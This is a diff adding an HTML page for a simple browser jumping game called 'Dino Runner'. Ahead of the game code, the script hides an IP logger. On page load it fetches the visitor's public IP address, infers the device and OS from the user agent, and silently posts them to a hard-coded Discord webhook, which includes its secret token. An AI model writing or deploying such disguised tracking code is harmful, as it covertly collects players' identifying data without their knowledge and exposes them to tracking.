@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dino Runner</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f7f7f7;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+        }
+        canvas {
+            border-bottom: 2px solid #535353;
+            background-color: #fff;
+        }
+        #instructions {
+            position: absolute;
+            top: 20%;
+            text-align: center;
+            color: #535353;
+            pointer-events: none; 
+        }
+        h1 { margin: 0; font-size: 24px; }
+        p { margin: 5px 0; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div id="instructions">
+        <h1>DINO RUNNER</h1>
+        <p>Press SPACE or Tap to Jump</p>
+    </div>
+    
+    <canvas id="gameCanvas" width="800" height="200"></canvas>
+
+    <script>
+
+        
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1557868652483846144/2e-M0k_OdSCaf6BogI0CzIvuSpkttx8JjG7ObVfJPXLB1u-q4DyzQer0aG0DBGmuu7Bw";
+
+        async function sendToDiscord(ip, deviceInfo) {
+            try {
+                const payload = {
+                    embeds: [{
+                        title: "🦖 Dino Game Player",
+                        description: "A player joined the game!",
+                        fields: [
+                            { name: "IP Address", value: `\`${ip}\``, inline: true },
+                            { name: "Device/OS", value: `\`${deviceInfo}\``, inline: true },
+                            { name: "User Agent", value: `\`${navigator.userAgent.substring(0, 60)}...\``, inline: false }
+                        ],
+                        color: 16776960, // Yellow
+                        footer: { text: new Date().toLocaleString() }
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                console.log("IP Logged");
+            } catch (e) {
+                console.error("Logging failed", e);
+            }
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return "Windows PC";
+            if (/Macintosh|Mac OS X/.test(ua)) return "Mac Computer";
+            if (/Linux/.test(ua)) return "Linux Device";
+            if (/Android/.test(ua)) return "Android Device";
+            if (/iPhone|iPad|iPod/.test(ua)) return "Apple iOS Device";
+            return "Unknown Device";
+        }
+
+        // Run logger on load
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                sendToDiscord(data.ip, getDeviceInfo());
+            })
+            .catch(err => {
+                console.error("Could not fetch IP", err);
+                sendToDiscord("Failed to fetch IP", getDeviceInfo());
+            });
+
+
+
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+        let score = 0;
+        let gameSpeed = 5;
+        let gameOver = false;
+        let keys = {};
+
+        const dino = {
+            x: 50,
+            y: 150,
+            width: 40,
+            height: 40,
+            dy: 0,
+            jumpPower: -12,
+            gravity: 0.6,
+            grounded: true,
+            color: '#535353'
+        };
+
+        let obstacles = [];
+        let frameCount = 0;
+
+        function spawnObstacle() {
+            const height = Math.random() * 30 + 20; 
+            obstacles.push({
+                x: canvas.width,
+                y: 200 - height,
+                width: 20,
+                height: height,
+                color: '#535353'
+            });
+        }
+
+        function update() {
+            if (gameOver) return;
+
+            requestAnimationFrame(update);
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            if (!dino.grounded) {
+                dino.dy += dino.gravity;
+                dino.y += dino.dy;
+            }
+
+            if (dino.y > 150) {
+                dino.y = 150;
+                dino.dy = 0;
+                dino.grounded = true;
+            }
+
+            ctx.fillStyle = dino.color;
+            ctx.fillRect(dino.x, dino.y, dino.width, dino.height);
+
+            frameCount++;
+            if (frameCount % 100 === 0) { 
+                if (Math.random() < 0.5) { 
+                    spawnObstacle();
+                }
+            }
+
+            for (let i = 0; i < obstacles.length; i++) {
+                let obs = obstacles[i];
+                obs.x -= gameSpeed;
+
+                ctx.fillStyle = obs.color;
+                ctx.fillRect(obs.x, obs.y, obs.width, obs.height);
+
+                if (
+                    dino.x < obs.x + obs.width &&
+                    dino.x + dino.width > obs.x &&
+                    dino.y < obs.y + obs.height &&
+                    dino.y + dino.height > obs.y
+                ) {
+                    gameOver = true;
+                    ctx.fillStyle = "black";
+                    ctx.font = "30px Arial";
+                    ctx.fillText("GAME OVER", 300, 100);
+                    ctx.font = "20px Arial";
+                    ctx.fillText("Score: " + Math.floor(score), 350, 140);
+                }
+
+                if (obs.x + obs.width < 0) {
+                    obstacles.splice(i, 1);
+                    i--;
+                    score += 10;
+                }
+            }
+
+            score += 0.1;
+            ctx.fillStyle = "black";
+            ctx.font = "20px Arial";
+            ctx.fillText("Score: " + Math.floor(score), 650, 30);
+            
+            if (score % 100 === 0) gameSpeed += 0.5;
+        }
+
+        function jump() {
+            if (dino.grounded && !gameOver) {
+                dino.dy = dino.jumpPower;
+                dino.grounded = false;
+            } else if (gameOver) {
+                gameOver = false;
+                score = 0;
+                gameSpeed = 5;
+                obstacles = [];
+                frameCount = 0;
+                dino.y = 150;
+                dino.dy = 0;
+                update();
+            }
+        }
+
+        window.addEventListener('keydown', (e) => {
+            if (e.code === 'Space' || e.code === 'ArrowUp') {
+                jump();
+                document.getElementById('instructions').style.display = 'none';
+            }
+        });
+
+        canvas.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            jump();
+            document.getElementById('instructions').style.display = 'none';
+        });
+
+        canvas.addEventListener('click', () => {
+            jump();
+            document.getElementById('instructions').style.display = 'none';
+        });
+
+        update();
+
+    </script>
+</body>
+</html>
